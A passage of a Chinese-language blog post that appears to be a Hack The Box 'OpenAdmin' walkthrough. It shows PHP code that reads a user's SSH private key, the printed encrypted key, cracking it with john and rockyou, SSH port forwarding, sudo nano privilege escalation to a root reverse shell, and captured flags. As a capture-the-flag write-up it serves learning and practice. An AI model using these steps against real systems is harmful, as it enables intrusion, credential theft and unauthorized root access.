.form-control &#123;</span><br><span class="line">            position: relative;</span><br><span class="line">            height: auto;</span><br><span class="line">            -webkit-box-sizing: border-box;</span><br><span class="line">            -moz-box-sizing: border-box;</span><br><span class="line">            box-sizing: border-box;</span><br><span class="line">            padding: <span class="number">10</span>px;</span><br><span class="line">            font-size: <span class="number">16</span>px;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin .form-control:focus &#123;</span><br><span class="line">            z-index: <span class="number">2</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin input[type=<span class="string">"email"</span>] &#123;</span><br><span class="line">            margin-bottom: <span class="number">-1</span>px;</span><br><span class="line">            border-bottom-right-radius: <span class="number">0</span>;</span><br><span class="line">            border-bottom-left-radius: <span class="number">0</span>;</span><br><span class="line">            border-color:<span class="comment">#017572;</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         .form-signin input[type=<span class="string">"password"</span>] &#123;</span><br><span class="line">            margin-bottom: <span class="number">10</span>px;</span><br><span class="line">            border-top-left-radius: <span class="number">0</span>;</span><br><span class="line">            border-top-right-radius: <span class="number">0</span>;</span><br><span class="line">            border-color:<span class="comment">#017572;</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         h2&#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            color: <span class="comment">#017572;</span></span><br><span class="line">         &#125;</span><br><span class="line">      &lt;/style&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/head&gt;</span><br><span class="line">   &lt;body&gt;</span><br><span class="line"></span><br><span class="line">      &lt;h2&gt;Enter Username <span class="keyword">and</span> Password&lt;/h2&gt;</span><br><span class="line">      &lt;div class = "container form-signin"&gt;</span><br><span class="line">        &lt;h2 class="featurette-heading"&gt;Login Restricted.&lt;span class="text-muted"&gt;&lt;/span&gt;&lt;/h2&gt;</span><br><span class="line">          <span class="meta">&lt;?php</span></span><br><span class="line">            $msg = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">              <span class="keyword">if</span> ($_POST[<span class="string">'username'</span>] == <span class="string">'jimmy'</span> &amp;&amp; hash(<span class="string">'sha512'</span>,$_POST[<span class="string">'password'</span>]) == <span class="string">'00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1'</span>) &#123;</span><br><span class="line">                  $_SESSION[<span class="string">'username'</span>] = <span class="string">'jimmy'</span>;</span><br><span class="line">                  header(<span class="string">"Location: /main.php"</span>);</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  $msg = <span class="string">'Wrong username or password.'</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         <span class="meta">?&gt;</span></span><br><span class="line">      &lt;/div&gt; &lt;!-- /container --&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class = "container"&gt;</span><br><span class="line"></span><br><span class="line">         &lt;form class = "form-signin" role = "form"</span><br><span class="line">            action = <span class="string">"&lt;?php echo htmlspecialchars($_SERVER['PHP_SELF']);</span></span><br><span class="line"><span class="string">            ?&gt;"</span> method = <span class="string">"post"</span>&gt;</span><br><span class="line">            &lt;h4 class = "form-signin-heading"&gt;&lt;?php echo $msg; ?&gt;&lt;/h4&gt;</span><br><span class="line">            &lt;input type = "text" class = "form-control"</span><br><span class="line">               name = <span class="string">"username"</span></span><br><span class="line">               required autofocus&gt;&lt;/br&gt;</span><br><span class="line">            &lt;input type = "password" class = "form-control"</span><br><span class="line">               name = <span class="string">"password"</span> required&gt;</span><br><span class="line">            &lt;button class = "btn btn-lg btn-primary btn-block" type = "submit"</span><br><span class="line">               name = <span class="string">"login"</span>&gt;Login&lt;/button&gt;</span><br><span class="line">         &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>分析代码逻辑：如果用户名为jimmy，密码的sha512为”00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1”，则设置session字段username的值为”jimmy”并跳转到main.php页面，查看main.php页面源码，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">'username'</span>])) &#123; header(<span class="string">"Location: /index.php"</span>); &#125;;</span><br><span class="line"><span class="comment"># Open Admin Trusted</span></span><br><span class="line"><span class="comment"># OpenAdmin</span></span><br><span class="line">$output = shell_exec(<span class="string">'cat /home/joanna/.ssh/id_rsa'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$output&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h3&gt;Don<span class="string">'t forget your "ninja" password&lt;/h3&gt;</span></span><br><span class="line"><span class="string">Click here to logout &lt;a href="logout.php" tite = "Logout"&gt;Session</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>main.php文件通过shell_exec函数读取”/home/joanna/.ssh/id_rsa”文件，如果拿到了用户的私钥，就可以爆破私钥的密码，然后通过私钥登陆系统。</p>
+<p><strong>端口转发，访问52846端口</strong><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># my machine</span></span><br><span class="line">$ ssh jimmy@10.10.10.171 -L 2145:localhost:52846</span><br></pre></td></tr></table></figure></p>
+<p>然后访问本地的2145端口，可正常访问目标的52846端口</p>
+<p>查询”00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1”的明文为“Revealed”</p>
+<p>登陆系统，拿到joanna用户的ssh私钥，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D</span><br><span class="line"></span><br><span class="line">kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8</span><br><span class="line">ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO</span><br><span class="line">ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE</span><br><span class="line">6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ</span><br><span class="line">ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du</span><br><span class="line">y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI</span><br><span class="line">9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4</span><br><span class="line">piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/</span><br><span class="line">/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH</span><br><span class="line">40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ</span><br><span class="line">fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb</span><br><span class="line">9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80</span><br><span class="line">X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg</span><br><span class="line">S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F</span><br><span class="line">FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh</span><br><span class="line">Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa</span><br><span class="line">RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z</span><br><span class="line">uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr</span><br><span class="line">1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2</span><br><span class="line">XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79</span><br><span class="line">yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM</span><br><span class="line">+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt</span><br><span class="line">qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt</span><br><span class="line">z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe</span><br><span class="line">K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
+<p><strong>john破解id_rsa</strong><br>1.转换id_rsa为john可破解的格式：<code>root@kali:~# python /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.txt</code></p>
+<p>2.使用字段破解：<code>john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt</code>，密码：<code>bloodninjas</code></p>
+<p><strong>通过id_rsa和私钥密码登陆ssh</strong><br>1.设置id_rsa文件权限：<code>chmod 600 joanna_id_rsa</code></p>
+<p>2.登陆：<code>ssh -i joanna_id_rsa joanna@10.10.10.171</code>，然后出现<code>Enter passphrase for key &#39;joanna_id_rsa&#39;:</code>的提示，输入id-rsa的密码”bloodninjas”即可登陆</p>
+<p>拿到user.txt：<code>c9b2cf07d40807e62af62660f0c81b5f</code></p>
+<h3 id="priv-root"><a href="#priv-root" class="headerlink" title="priv: root"></a>priv: root</h3><p>1.查看sudoers配置：<code>sudo -l</code>，发现<code>nano</code>，通过nano提权</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">joanna@openadmin:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> joanna on openadmin:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User joanna may run the following commands on openadmin:</span><br><span class="line">    (ALL) NOPASSWD: /bin/nano /opt/priv</span><br></pre></td></tr></table></figure>
+<p><strong>nano执行命令(mac)</strong><br><code>sudo /bin/nano /opt/priv</code>，然后进入nano编辑界面；键入：”control+R control+X”，然后进入如下界面：<br><img src="htb_openadmin_nano_cmd.png" alt="htb_openadmin_nano_cmd.png"></p>
+<p>然后输入反弹shell命令，获得root的shell：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 4444</span><br><span class="line">root@openadmin:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">root@openadmin:~<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@openadmin:/root<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@openadmin:/root<span class="comment"># cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line">2f907ed450b361b2c2bf4e8795d5b561</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/OpenNetAdmin-v18-1-1/" rel="tag"># OpenNetAdmin v18.1.1</a>
+          
+            <a href="/tags/Password-Reuse/" rel="tag"># Password Reuse</a>
+          
+            <a href="/tags/Local-Port-Exploit/" rel="tag"># Local Port Exploit</a>
+          
+            <a href="/tags/Crack-id-rsa/" rel="tag"># Crack id_rsa</a>
+          
+            <a href="/tags/sudo/" rel="tag"># sudo</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/12/htb-windows-Forest/" rel="next" title="htb-windows-Forest">
+                <i class="fa fa-chevron-left"></i> htb-windows-Forest
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/20/HTB-Linux-Traverxec/" rel="prev" title="HTB Linux Traverxec">
+                HTB Linux Traverxec <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#user-jimmy"><span class="nav-number">2.</span> <span class="nav-text">user: jimmy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#user-joanna"><span class="nav-number">3.</span> <span class="nav-text">user: joanna</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#priv-root"><span class="nav-number">4.</span> <span class="nav-text">priv: root</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
